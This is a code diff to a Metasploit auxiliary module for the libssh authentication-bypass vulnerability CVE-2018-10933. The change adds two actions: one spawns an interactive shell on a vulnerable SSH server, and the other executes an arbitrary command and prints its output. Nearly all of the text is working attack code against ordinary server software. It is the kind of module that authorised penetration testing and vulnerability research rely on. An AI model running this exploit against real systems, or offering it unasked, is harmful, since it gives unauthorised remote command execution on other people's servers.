@@ -35,12 +35,17 @@ class MetasploitModule < Msf::Auxiliary
         ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
       ],
       'DisclosureDate' => 'Oct 16 2018',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'Actions'        => [
+        ['Shell',   'Description' => 'Spawn a shell'],
+        ['Execute', 'Description' => 'Execute a command']
+      ],
+      'DefaultAction'  => 'Shell'
     ))
 
     register_options([
       Opt::RPORT(22),
-      OptString.new('CMD',        [false, 'Command to execute']),
+      OptString.new('CMD',        [false, 'Command or alternative shell']),
       OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
       OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
     ])
@@ -72,6 +77,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
+    if action.name == 'Execute' && datastore['CMD'].blank?
+      print_error('CMD is required to be set for the Execute action')
+      return
+    end
+
     factory = ssh_socket_factory
 
     ssh_opts = {
@@ -124,7 +134,19 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+    case action.name
+    when 'Shell'
+      start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+    when 'Execute'
+      output = shell.channel[:data].chomp
+
+      if output.blank?
+        print_error("Empty or blank output: #{datastore['CMD']}")
+        return
+      end
+
+      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
+    end
   end
 
   def rport
